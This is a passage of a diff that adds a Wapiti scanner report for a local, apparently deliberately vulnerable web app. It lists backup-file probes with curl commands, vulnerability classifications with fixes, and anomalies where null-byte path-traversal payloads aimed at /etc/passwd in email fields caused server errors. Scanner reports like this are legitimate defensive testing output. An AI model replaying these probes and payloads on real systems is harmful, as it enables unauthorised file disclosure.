+        "parameter": "", 
+        "method": "GET"
+      }, 
+      {
+        "info": "Backup file http://localhost:3000/tutorials/insecure_components.save found for http://localhost:3000/tutorials/insecure_components", 
+        "http_request": "GET /tutorials/insecure_components.save HTTP/1.1\nHost: localhost:3000\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://localhost:3000/tutorials/insecure_components.save\"", 
+        "path": "/tutorials/insecure_components.save", 
+        "parameter": "", 
+        "method": "GET"
+      }, 
+      {
+        "info": "Backup file http://localhost:3000/tutorials/insecure_components.bak found for http://localhost:3000/tutorials/insecure_components", 
+        "http_request": "GET /tutorials/insecure_components.bak HTTP/1.1\nHost: localhost:3000\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://localhost:3000/tutorials/insecure_components.bak\"", 
+        "path": "/tutorials/insecure_components.bak", 
+        "parameter": "", 
+        "method": "GET"
+      }, 
+      {
+        "info": "Backup file http://localhost:3000/tutorials/redirects~ found for http://localhost:3000/tutorials/redirects", 
+        "http_request": "GET /tutorials/redirects~ HTTP/1.1\nHost: localhost:3000\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://localhost:3000/tutorials/redirects~\"", 
+        "path": "/tutorials/redirects~", 
+        "parameter": "", 
+        "method": "GET"
+      }, 
+      {
+        "info": "Backup file http://localhost:3000/tutorials/redirects.backup found for http://localhost:3000/tutorials/redirects", 
+        "http_request": "GET /tutorials/redirects.backup HTTP/1.1\nHost: localhost:3000\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://localhost:3000/tutorials/redirects.backup\"", 
+        "path": "/tutorials/redirects.backup", 
+        "parameter": "", 
+        "method": "GET"
+      }, 
+      {
+        "info": "Backup file http://localhost:3000/tutorials/redirects.bck found for http://localhost:3000/tutorials/redirects", 
+        "http_request": "GET /tutorials/redirects.bck HTTP/1.1\nHost: localhost:3000\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://localhost:3000/tutorials/redirects.bck\"", 
+        "path": "/tutorials/redirects.bck", 
+        "parameter": "", 
+        "method": "GET"
+      }, 
+      {
+        "info": "Backup file http://localhost:3000/tutorials/redirects.old found for http://localhost:3000/tutorials/redirects", 
+        "http_request": "GET /tutorials/redirects.old HTTP/1.1\nHost: localhost:3000\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://localhost:3000/tutorials/redirects.old\"", 
+        "path": "/tutorials/redirects.old", 
+        "parameter": "", 
+        "method": "GET"
+      }, 
+      {
+        "info": "Backup file http://localhost:3000/tutorials/redirects.save found for http://localhost:3000/tutorials/redirects", 
+        "http_request": "GET /tutorials/redirects.save HTTP/1.1\nHost: localhost:3000\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://localhost:3000/tutorials/redirects.save\"", 
+        "path": "/tutorials/redirects.save", 
+        "parameter": "", 
+        "method": "GET"
+      }, 
+      {
+        "info": "Backup file http://localhost:3000/tutorials/redirects.bak found for http://localhost:3000/tutorials/redirects", 
+        "http_request": "GET /tutorials/redirects.bak HTTP/1.1\nHost: localhost:3000\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://localhost:3000/tutorials/redirects.bak\"", 
+        "path": "/tutorials/redirects.bak", 
+        "parameter": "", 
+        "method": "GET"
+      }, 
+      {
+        "info": "Backup file http://localhost:3000/tutorials/gauntlt~ found for http://localhost:3000/tutorials/gauntlt", 
+        "http_request": "GET /tutorials/gauntlt~ HTTP/1.1\nHost: localhost:3000\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://localhost:3000/tutorials/gauntlt~\"", 
+        "path": "/tutorials/gauntlt~", 
+        "parameter": "", 
+        "method": "GET"
+      }, 
+      {
+        "info": "Backup file http://localhost:3000/tutorials/gauntlt.backup found for http://localhost:3000/tutorials/gauntlt", 
+        "http_request": "GET /tutorials/gauntlt.backup HTTP/1.1\nHost: localhost:3000\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://localhost:3000/tutorials/gauntlt.backup\"", 
+        "path": "/tutorials/gauntlt.backup", 
+        "parameter": "", 
+        "method": "GET"
+      }, 
+      {
+        "info": "Backup file http://localhost:3000/tutorials/gauntlt.bck found for http://localhost:3000/tutorials/gauntlt", 
+        "http_request": "GET /tutorials/gauntlt.bck HTTP/1.1\nHost: localhost:3000\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://localhost:3000/tutorials/gauntlt.bck\"", 
+        "path": "/tutorials/gauntlt.bck", 
+        "parameter": "", 
+        "method": "GET"
+      }, 
+      {
+        "info": "Backup file http://localhost:3000/tutorials/gauntlt.old found for http://localhost:3000/tutorials/gauntlt", 
+        "http_request": "GET /tutorials/gauntlt.old HTTP/1.1\nHost: localhost:3000\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://localhost:3000/tutorials/gauntlt.old\"", 
+        "path": "/tutorials/gauntlt.old", 
+        "parameter": "", 
+        "method": "GET"
+      }, 
+      {
+        "info": "Backup file http://localhost:3000/tutorials/gauntlt.save found for http://localhost:3000/tutorials/gauntlt", 
+        "http_request": "GET /tutorials/gauntlt.save HTTP/1.1\nHost: localhost:3000\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://localhost:3000/tutorials/gauntlt.save\"", 
+        "path": "/tutorials/gauntlt.save", 
+        "parameter": "", 
+        "method": "GET"
+      }, 
+      {
+        "info": "Backup file http://localhost:3000/tutorials/gauntlt.bak found for http://localhost:3000/tutorials/gauntlt", 
+        "http_request": "GET /tutorials/gauntlt.bak HTTP/1.1\nHost: localhost:3000\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://localhost:3000/tutorials/gauntlt.bak\"", 
+        "path": "/tutorials/gauntlt.bak", 
+        "parameter": "", 
+        "method": "GET"
+      }, 
+      {
+        "info": "Backup file http://localhost:3000/tutorials/guard~ found for http://localhost:3000/tutorials/guard", 
+        "http_request": "GET /tutorials/guard~ HTTP/1.1\nHost: localhost:3000\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://localhost:3000/tutorials/guard~\"", 
+        "path": "/tutorials/guard~", 
+        "parameter": "", 
+        "method": "GET"
+      }, 
+      {
+        "info": "Backup file http://localhost:3000/tutorials/guard.backup found for http://localhost:3000/tutorials/guard", 
+        "http_request": "GET /tutorials/guard.backup HTTP/1.1\nHost: localhost:3000\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://localhost:3000/tutorials/guard.backup\"", 
+        "path": "/tutorials/guard.backup", 
+        "parameter": "", 
+        "method": "GET"
+      }, 
+      {
+        "info": "Backup file http://localhost:3000/tutorials/guard.bck found for http://localhost:3000/tutorials/guard", 
+        "http_request": "GET /tutorials/guard.bck HTTP/1.1\nHost: localhost:3000\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://localhost:3000/tutorials/guard.bck\"", 
+        "path": "/tutorials/guard.bck", 
+        "parameter": "", 
+        "method": "GET"
+      }, 
+      {
+        "info": "Backup file http://localhost:3000/tutorials/guard.old found for http://localhost:3000/tutorials/guard", 
+        "http_request": "GET /tutorials/guard.old HTTP/1.1\nHost: localhost:3000\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://localhost:3000/tutorials/guard.old\"", 
+        "path": "/tutorials/guard.old", 
+        "parameter": "", 
+        "method": "GET"
+      }, 
+      {
+        "info": "Backup file http://localhost:3000/tutorials/guard.save found for http://localhost:3000/tutorials/guard", 
+        "http_request": "GET /tutorials/guard.save HTTP/1.1\nHost: localhost:3000\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://localhost:3000/tutorials/guard.save\"", 
+        "path": "/tutorials/guard.save", 
+        "parameter": "", 
+        "method": "GET"
+      }, 
+      {
+        "info": "Backup file http://localhost:3000/tutorials/guard.bak found for http://localhost:3000/tutorials/guard", 
+        "http_request": "GET /tutorials/guard.bak HTTP/1.1\nHost: localhost:3000\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://localhost:3000/tutorials/guard.bak\"", 
+        "path": "/tutorials/guard.bak", 
+        "parameter": "", 
+        "method": "GET"
+      }, 
+      {
+        "info": "Backup file http://localhost:3000/tutorials/mass_assignment~ found for http://localhost:3000/tutorials/mass_assignment", 
+        "http_request": "GET /tutorials/mass_assignment~ HTTP/1.1\nHost: localhost:3000\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://localhost:3000/tutorials/mass_assignment~\"", 
+        "path": "/tutorials/mass_assignment~", 
+        "parameter": "", 
+        "method": "GET"
+      }, 
+      {
+        "info": "Backup file http://localhost:3000/tutorials/mass_assignment.backup found for http://localhost:3000/tutorials/mass_assignment", 
+        "http_request": "GET /tutorials/mass_assignment.backup HTTP/1.1\nHost: localhost:3000\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://localhost:3000/tutorials/mass_assignment.backup\"", 
+        "path": "/tutorials/mass_assignment.backup", 
+        "parameter": "", 
+        "method": "GET"
+      }, 
+      {
+        "info": "Backup file http://localhost:3000/tutorials/mass_assignment.bck found for http://localhost:3000/tutorials/mass_assignment", 
+        "http_request": "GET /tutorials/mass_assignment.bck HTTP/1.1\nHost: localhost:3000\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://localhost:3000/tutorials/mass_assignment.bck\"", 
+        "path": "/tutorials/mass_assignment.bck", 
+        "parameter": "", 
+        "method": "GET"
+      }, 
+      {
+        "info": "Backup file http://localhost:3000/tutorials/mass_assignment.old found for http://localhost:3000/tutorials/mass_assignment", 
+        "http_request": "GET /tutorials/mass_assignment.old HTTP/1.1\nHost: localhost:3000\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://localhost:3000/tutorials/mass_assignment.old\"", 
+        "path": "/tutorials/mass_assignment.old", 
+        "parameter": "", 
+        "method": "GET"
+      }, 
+      {
+        "info": "Backup file http://localhost:3000/tutorials/mass_assignment.save found for http://localhost:3000/tutorials/mass_assignment", 
+        "http_request": "GET /tutorials/mass_assignment.save HTTP/1.1\nHost: localhost:3000\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://localhost:3000/tutorials/mass_assignment.save\"", 
+        "path": "/tutorials/mass_assignment.save", 
+        "parameter": "", 
+        "method": "GET"
+      }, 
+      {
+        "info": "Backup file http://localhost:3000/tutorials/mass_assignment.bak found for http://localhost:3000/tutorials/mass_assignment", 
+        "http_request": "GET /tutorials/mass_assignment.bak HTTP/1.1\nHost: localhost:3000\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://localhost:3000/tutorials/mass_assignment.bak\"", 
+        "path": "/tutorials/mass_assignment.bak", 
+        "parameter": "", 
+        "method": "GET"
+      }, 
+      {
+        "info": "Backup file http://localhost:3000/tutorials/logic_flaws~ found for http://localhost:3000/tutorials/logic_flaws", 
+        "http_request": "GET /tutorials/logic_flaws~ HTTP/1.1\nHost: localhost:3000\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://localhost:3000/tutorials/logic_flaws~\"", 
+        "path": "/tutorials/logic_flaws~", 
+        "parameter": "", 
+        "method": "GET"
+      }, 
+      {
+        "info": "Backup file http://localhost:3000/tutorials/logic_flaws.backup found for http://localhost:3000/tutorials/logic_flaws", 
+        "http_request": "GET /tutorials/logic_flaws.backup HTTP/1.1\nHost: localhost:3000\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://localhost:3000/tutorials/logic_flaws.backup\"", 
+        "path": "/tutorials/logic_flaws.backup", 
+        "parameter": "", 
+        "method": "GET"
+      }, 
+      {
+        "info": "Backup file http://localhost:3000/tutorials/logic_flaws.bck found for http://localhost:3000/tutorials/logic_flaws", 
+        "http_request": "GET /tutorials/logic_flaws.bck HTTP/1.1\nHost: localhost:3000\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://localhost:3000/tutorials/logic_flaws.bck\"", 
+        "path": "/tutorials/logic_flaws.bck", 
+        "parameter": "", 
+        "method": "GET"
+      }, 
+      {
+        "info": "Backup file http://localhost:3000/tutorials/logic_flaws.old found for http://localhost:3000/tutorials/logic_flaws", 
+        "http_request": "GET /tutorials/logic_flaws.old HTTP/1.1\nHost: localhost:3000\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://localhost:3000/tutorials/logic_flaws.old\"", 
+        "path": "/tutorials/logic_flaws.old", 
+        "parameter": "", 
+        "method": "GET"
+      }, 
+      {
+        "info": "Backup file http://localhost:3000/tutorials/logic_flaws.save found for http://localhost:3000/tutorials/logic_flaws", 
+        "http_request": "GET /tutorials/logic_flaws.save HTTP/1.1\nHost: localhost:3000\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://localhost:3000/tutorials/logic_flaws.save\"", 
+        "path": "/tutorials/logic_flaws.save", 
+        "parameter": "", 
+        "method": "GET"
+      }, 
+      {
+        "info": "Backup file http://localhost:3000/tutorials/logic_flaws.bak found for http://localhost:3000/tutorials/logic_flaws", 
+        "http_request": "GET /tutorials/logic_flaws.bak HTTP/1.1\nHost: localhost:3000\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://localhost:3000/tutorials/logic_flaws.bak\"", 
+        "path": "/tutorials/logic_flaws.bak", 
+        "parameter": "", 
+        "method": "GET"
+      }, 
+      {
+        "info": "Backup file http://localhost:3000/tutorials/metaprogramming~ found for http://localhost:3000/tutorials/metaprogramming", 
+        "http_request": "GET /tutorials/metaprogramming~ HTTP/1.1\nHost: localhost:3000\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://localhost:3000/tutorials/metaprogramming~\"", 
+        "path": "/tutorials/metaprogramming~", 
+        "parameter": "", 
+        "method": "GET"
+      }, 
+      {
+        "info": "Backup file http://localhost:3000/tutorials/metaprogramming.backup found for http://localhost:3000/tutorials/metaprogramming", 
+        "http_request": "GET /tutorials/metaprogramming.backup HTTP/1.1\nHost: localhost:3000\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://localhost:3000/tutorials/metaprogramming.backup\"", 
+        "path": "/tutorials/metaprogramming.backup", 
+        "parameter": "", 
+        "method": "GET"
+      }, 
+      {
+        "info": "Backup file http://localhost:3000/tutorials/metaprogramming.bck found for http://localhost:3000/tutorials/metaprogramming", 
+        "http_request": "GET /tutorials/metaprogramming.bck HTTP/1.1\nHost: localhost:3000\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://localhost:3000/tutorials/metaprogramming.bck\"", 
+        "path": "/tutorials/metaprogramming.bck", 
+        "parameter": "", 
+        "method": "GET"
+      }, 
+      {
+        "info": "Backup file http://localhost:3000/tutorials/metaprogramming.old found for http://localhost:3000/tutorials/metaprogramming", 
+        "http_request": "GET /tutorials/metaprogramming.old HTTP/1.1\nHost: localhost:3000\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://localhost:3000/tutorials/metaprogramming.old\"", 
+        "path": "/tutorials/metaprogramming.old", 
+        "parameter": "", 
+        "method": "GET"
+      }, 
+      {
+        "info": "Backup file http://localhost:3000/tutorials/metaprogramming.save found for http://localhost:3000/tutorials/metaprogramming", 
+        "http_request": "GET /tutorials/metaprogramming.save HTTP/1.1\nHost: localhost:3000\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://localhost:3000/tutorials/metaprogramming.save\"", 
+        "path": "/tutorials/metaprogramming.save", 
+        "parameter": "", 
+        "method": "GET"
+      }, 
+      {
+        "info": "Backup file http://localhost:3000/tutorials/metaprogramming.bak found for http://localhost:3000/tutorials/metaprogramming", 
+        "http_request": "GET /tutorials/metaprogramming.bak HTTP/1.1\nHost: localhost:3000\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://localhost:3000/tutorials/metaprogramming.bak\"", 
+        "path": "/tutorials/metaprogramming.bak", 
+        "parameter": "", 
+        "method": "GET"
+      }, 
+      {
+        "info": "Backup file http://localhost:3000/forgot_password.backup found for http://localhost:3000/forgot_password", 
+        "http_request": "GET /forgot_password.backup HTTP/1.1\nHost: localhost:3000\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://localhost:3000/forgot_password.backup\"", 
+        "path": "/forgot_password.backup", 
+        "parameter": "", 
+        "method": "GET"
+      }, 
+      {
+        "info": "Backup file http://localhost:3000/forgot_password.bck found for http://localhost:3000/forgot_password", 
+        "http_request": "GET /forgot_password.bck HTTP/1.1\nHost: localhost:3000\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://localhost:3000/forgot_password.bck\"", 
+        "path": "/forgot_password.bck", 
+        "parameter": "", 
+        "method": "GET"
+      }, 
+      {
+        "info": "Backup file http://localhost:3000/forgot_password.old found for http://localhost:3000/forgot_password", 
+        "http_request": "GET /forgot_password.old HTTP/1.1\nHost: localhost:3000\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://localhost:3000/forgot_password.old\"", 
+        "path": "/forgot_password.old", 
+        "parameter": "", 
+        "method": "GET"
+      }, 
+      {
+        "info": "Backup file http://localhost:3000/forgot_password.save found for http://localhost:3000/forgot_password", 
+        "http_request": "GET /forgot_password.save HTTP/1.1\nHost: localhost:3000\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://localhost:3000/forgot_password.save\"", 
+        "path": "/forgot_password.save", 
+        "parameter": "", 
+        "method": "GET"
+      }, 
+      {
+        "info": "Backup file http://localhost:3000/forgot_password.bak found for http://localhost:3000/forgot_password", 
+        "http_request": "GET /forgot_password.bak HTTP/1.1\nHost: localhost:3000\n", 
+        "level": "1", 
+        "curl_command": "curl \"http://localhost:3000/forgot_password.bak\"", 
+        "path": "/forgot_password.bak", 
+        "parameter": "", 
+        "method": "GET"
+      }
+    ], 
+    "SQL Injection": [], 
+    "Blind SQL Injection": [], 
+    "File Handling": [], 
+    "Potentially dangerous file": [], 
+    "CRLF Injection": [], 
+    "Commands execution": []
+  }, 
+  "infos": {
+    "date": "Wed, 30 Jul 2014 10:17:16 +0000", 
+    "scope": "folder", 
+    "version": "Wapiti 2.3.0", 
+    "target": "localhost:3000"
+  }, 
+  "classifications": {
+    "Resource consumption": {
+      "ref": {
+        "CWE-400: Uncontrolled Resource Consumption ('Resource Exhaustion')": "http://cwe.mitre.org/data/definitions/400.html", 
+        "http://www.owasp.org/index.php/Asymmetric_resource_consumption_(amplification)": "http://www.owasp.org/index.php/Asymmetric_resource_consumption_(amplification)"
+      }, 
+      "sol": "The involved script is maybe using the server resources (CPU, memory, network, file access...) in a non-efficient way", 
+      "desc": "Resource consumption description"
+    }, 
+    "Internal Server Error": {
+      "ref": {
+        "Wikipedia article for 5xx HTTP error codes": "https://en.wikipedia.org/wiki/List_of_HTTP_status_codes#5xx_Server_Error"
+      }, 
+      "sol": "More information about the error should be found in the server logs.", 
+      "desc": "Internal server error description"
+    }, 
+    "Cross Site Scripting": {
+      "ref": {
+        "CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')": "http://cwe.mitre.org/data/definitions/79.html", 
+        "http://en.wikipedia.org/wiki/Cross-site_scripting": "http://en.wikipedia.org/wiki/Cross-site_scripting", 
+        "VulneraNET wiki: Cross Site Scripting Flaw article": "http://lab.gsi.dit.upm.es/semanticwiki/index.php/Cross_Site_Scripting_Flaw", 
+        "http://www.owasp.org/index.php/Cross_Site_Scripting": "http://www.owasp.org/index.php/Cross_Site_Scripting"
+      }, 
+      "sol": "The best way to protect a web application from XSS attacks is ensure that the application performs validation of all headers, cookies, query strings, form fields, and hidden fields. Encoding user supplied output in the server side can also defeat XSS vulnerabilities by preventing inserted scripts from being transmitted to users in an executable form. Applications can gain significant protection from javascript based attacks by converting the following characters in all generated output to the appropriate HTML entity encoding:  &lt;, &gt;, &amp;, &quot;, ', (, ), #, %, ; , +, -.", 
+      "desc": "Cross-site scripting (XSS) is a type of computer security vulnerability typically found in web applications which allow code injection by malicious web users into the web pages viewed by other users. Examples of such code include HTML code and client-side scripts."
+    }, 
+    "Htaccess Bypass": {
+      "ref": {
+        "http://blog.teusink.net/2009/07/common-apache-htaccess-misconfiguration.html": "http://blog.teusink.net/2009/07/common-apache-htaccess-misconfiguration.html", 
+        "CWE-538: File and Directory Information Exposure": "http://cwe.mitre.org/data/definitions/538.html"
+      }, 
+      "sol": "Make sure every HTTP method is forbidden if the credentials are bad.", 
+      "desc": "htaccess files are used to restrict access to some files or HTTP method. In some case it may be possible to bypass this restriction and access the files."
+    }, 
+    "Backup file": {
+      "ref": {
+        "Testing for Old, Backup and Unreferenced Files (OWASP-CM-006)": "http://www.owasp.org/index.php/Testing_for_Old,_Backup_and_Unreferenced_Files_(OWASP-CM-006)", 
+        "CWE-530: Exposure of Backup File to an Unauthorized Control Sphere": "http://cwe.mitre.org/data/definitions/530.html"
+      }, 
+      "sol": "The webadmin must manually delete the backup files or remove it from the web root. He should also reconfigure its editor to deactivate automatic backups.", 
+      "desc": "It may be possible to find backup files of scripts on the webserver that the web-admin put here to save a previous version or backup files that are automaticallygenerated by the software editor used (like for example Emacs). These copies may reveal interesting informations like source code or credentials"
+    }, 
+    "SQL Injection": {
+      "ref": {
+        "http://www.owasp.org/index.php/SQL_Injection": "http://www.owasp.org/index.php/SQL_Injection", 
+        "http://en.wikipedia.org/wiki/SQL_injection": "http://en.wikipedia.org/wiki/SQL_injection", 
+        "CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')": "http://cwe.mitre.org/data/definitions/89.html"
+      }, 
+      "sol": "To protect against SQL injection, user input must not directly be embedded in SQL statements. Instead, user input must be escaped or filtered or parameterized statements must be used.", 
+      "desc": "SQL injection vulnerabilities allow an attacker to alter the queries executed on the backend database. An attacker may then be able to extract or modify informations stored in the database or even escalate his privileges on the system."
+    }, 
+    "Blind SQL Injection": {
+      "ref": {
+        "CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')": "http://cwe.mitre.org/data/definitions/89.html", 
+        "http://www.imperva.com/resources/adc/blind_sql_server_injection.html": "http://www.imperva.com/resources/adc/blind_sql_server_injection.html", 
+        "http://www.owasp.org/index.php/Blind_SQL_Injection": "http://www.owasp.org/index.php/Blind_SQL_Injection"
+      }, 
+      "sol": "To protect against SQL injection, user input must not directly be embedded in SQL statements. Instead, user input must be escaped or filtered or parameterized statements must be used.", 
+      "desc": "Blind SQL injection is a technique that exploits a vulnerability occurring in the database of an application. This kind of vulnerability is harder to detect than basic SQL injections because no error message will be displayed on the webpage."
+    }, 
+    "File Handling": {
+      "ref": {
+        "http://www.owasp.org/index.php/Path_Traversal": "http://www.owasp.org/index.php/Path_Traversal", 
+        "http://www.acunetix.com/websitesecurity/directory-traversal.htm": "http://www.acunetix.com/websitesecurity/directory-traversal.htm", 
+        "CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')": "http://cwe.mitre.org/data/definitions/22.html"
+      }, 
+      "sol": "Prefer working without user input when using file system calls. Use indexes rather than actual portions of file names when templating or using language files (eg: value 5 from the user submission = Czechoslovakian, rather than expecting the user to return 'Czechoslovakian'). Ensure the user cannot supply all parts of the path - surround it with your path code. Validate the user's input by only accepting known good - do not sanitize the data. Use chrooted jails and code access policies to restrict where the files can be obtained or saved to.", 
+      "desc": "This attack is also known as Path or Directory Traversal, its aim is the access to files and directories that are stored outside the web root folder. The attacker tries to explore the directories stored in the web server. The attacker uses some techniques, for instance, the manipulation of variables that reference files with 'dot-dot-slash (../)' sequences and its variations to move up to root directory to navigate through the file system."
+    }, 
+    "Potentially dangerous file": {
+      "ref": {
+        "The Open Source Vulnerability Database": "http://osvdb.org/"
+      }, 
+      "sol": "Make sure the script is up-to-date and restrict access to it if possible", 
+      "desc": "A file with potential vulnerabilities has been found on the website."
+    }, 
+    "CRLF Injection": {
+      "ref": {
+        "CWE-93: Improper Neutralization of CRLF Sequences ('CRLF Injection')": "http://cwe.mitre.org/data/definitions/93.html", 
+        "http://www.owasp.org/index.php/CRLF_Injection": "http://www.owasp.org/index.php/CRLF_Injection", 
+        "http://www.acunetix.com/websitesecurity/crlf-injection.htm": "http://www.acunetix.com/websitesecurity/crlf-injection.htm", 
+        "VulneraNET wiki: CRLF Injection article": "http://lab.gsi.dit.upm.es/semanticwiki/index.php/CRLF_Injection"
+      }, 
+      "sol": "Check the submitted parameters and do not allow CRLF to be injected by filtering CRLF", 
+      "desc": "The term CRLF refers to Carriage Return (ASCII 13, \\r) Line Feed (ASCII 10, \\n). They're used to note the termination of a line, however, dealt with differently in today's popular Operating Systems. For example: in Windows both a CR and LF are required to note the end of a line, whereas in Linux/UNIX a LF is only required. This combination of CR and LR is used for example when pressing 'Enter' on the keyboard. Depending on the application being used, pressing 'Enter' generally instructs the application to start a new line, or to send a command."
+    }, 
+    "Commands execution": {
+      "ref": {
+        "CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')": "http://cwe.mitre.org/data/definitions/78.html", 
+        "http://www.owasp.org/index.php/Command_Injection": "http://www.owasp.org/index.php/Command_Injection"
+      }, 
+      "sol": "Prefer working without user input when using file system calls", 
+      "desc": "This attack consists in executing system commands on the server. The attacker tries to inject this commands in the request parameters"
+    }
+  }, 
+  "anomalies": {
+    "Resource consumption": [], 
+    "Internal Server Error": [
+      {
+        "info": "The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter user%5Bemail%5D", 
+        "http_request": "POST /users HTTP/1.1\nHost: localhost:3000\nReferer: http://localhost:3000/signup\nContent-Type: application/x-www-form-urlencoded\n\nutf8=&authenticity_token=chAvW%2BiHJs92VuDCP71J9LEKjW1cuKOf0jGdZBUHv4Y%3D&user%5Bemail%5D=%2Fe%00&user%5Bfirst_name%5D=default&user%5Blast_name%5D=default&user%5Bpassword%5D=letmein&user%5Bpassword_confirmation%5D=letmein&commit=Submit", 
+        "level": "1", 
+        "curl_command": "curl \"http://localhost:3000/users\" -e \"http://localhost:3000/signup\" -d \"utf8=&authenticity_token=chAvW%2BiHJs92VuDCP71J9LEKjW1cuKOf0jGdZBUHv4Y%3D&user%5Bemail%5D=%2Fe%00&user%5Bfirst_name%5D=default&user%5Blast_name%5D=default&user%5Bpassword%5D=letmein&user%5Bpassword_confirmation%5D=letmein&commit=Submit\"", 
+        "path": "/users", 
+        "parameter": "user%5Bemail%5D", 
+        "method": "POST"
+      }, 
+      {
+        "info": "The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter email", 
+        "http_request": "POST /forgot_password HTTP/1.1\nHost: localhost:3000\nReferer: http://localhost:3000/forgot_password\nContent-Type: application/x-www-form-urlencoded\n\nutf8=&authenticity_token=chAvW%2BiHJs92VuDCP71J9LEKjW1cuKOf0jGdZBUHv4Y%3D&email=%2Fe%00&commit=Reset%20Password", 
+        "level": "1", 
+        "curl_command": "curl \"http://localhost:3000/forgot_password\" -e \"http://localhost:3000/forgot_password\" -d \"utf8=&authenticity_token=chAvW%2BiHJs92VuDCP71J9LEKjW1cuKOf0jGdZBUHv4Y%3D&email=%2Fe%00&commit=Reset%20Password\"", 
+        "path": "/forgot_password", 
+        "parameter": "email", 
+        "method": "POST"
+      }, 
+      {
+        "info": "The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter email", 
+        "http_request": "POST /forgot_password HTTP/1.1\nHost: localhost:3000\nReferer: http://localhost:3000/forgot_password\nContent-Type: application/x-www-form-urlencoded\n\nutf8=%E2%9C%93&authenticity_token=chAvW%2BiHJs92VuDCP71J9LEKjW1cuKOf0jGdZBUHv4Y%3D&email=%2Fe%00&commit=Reset%20Password", 
+        "level": "1", 
+        "curl_command": "curl \"http://localhost:3000/forgot_password\" -e \"http://localhost:3000/forgot_password\" -d \"utf8=%E2%9C%93&authenticity_token=chAvW%2BiHJs92VuDCP71J9LEKjW1cuKOf0jGdZBUHv4Y%3D&email=%2Fe%00&commit=Reset%20Password\"", 
+        "path": "/forgot_password", 
+        "parameter": "email", 
+        "method": "POST"
+      }, 
+      {
+        "info": "The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter user%5Bemail%5D", 
+        "http_request": "POST /users HTTP/1.1\nHost: localhost:3000\nReferer: http://localhost:3000/signup\nContent-Type: application/x-www-form-urlencoded\n\nutf8=&authenticity_token=chAvW%2BiHJs92VuDCP71J9LEKjW1cuKOf0jGdZBUHv4Y%3D&user%5Bemail%5D=%2Fetc%2Fpasswd%00&user%5Bfirst_name%5D=default&user%5Blast_name%5D=default&user%5Bpassword%5D=letmein&user%5Bpassword_confirmation%5D=letmein&commit=Submit", 
+        "level": "1", 
+        "curl_command": "curl \"http://localhost:3000/users\" -e \"http://localhost:3000/signup\" -d \"utf8=&authenticity_token=chAvW%2BiHJs92VuDCP71J9LEKjW1cuKOf0jGdZBUHv4Y%3D&user%5Bemail%5D=%2Fetc%2Fpasswd%00&user%5Bfirst_name%5D=default&user%5Blast_name%5D=default&user%5Bpassword%5D=letmein&user%5Bpassword_confirmation%5D=letmein&commit=Submit\"", 
+        "path": "/users", 
+        "parameter": "user%5Bemail%5D", 
+        "method": "POST"
+      }, 
+      {
+        "info": "The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter email", 
+        "http_request": "POST /forgot_password HTTP/1.1\nHost: localhost:3000\nReferer: http://localhost:3000/forgot_password\nContent-Type: application/x-www-form-urlencoded\n\nutf8=&authenticity_token=chAvW%2BiHJs92VuDCP71J9LEKjW1cuKOf0jGdZBUHv4Y%3D&email=%2Fetc%2Fpasswd%00&commit=Reset%20Password", 
+        "level": "1", 
+        "curl_command": "curl \"http://localhost:3000/forgot_password\" -e \"http://localhost:3000/forgot_password\" -d \"utf8=&authenticity_token=chAvW%2BiHJs92VuDCP71J9LEKjW1cuKOf0jGdZBUHv4Y%3D&email=%2Fetc%2Fpasswd%00&commit=Reset%20Password\"", 
+        "path": "/forgot_password", 
+        "parameter": "email", 
+        "method": "POST"
+      }, 
+      {
+        "info": "The server responded with a 500 HTTP error code while attempting to inject a payload in the parameter email", 
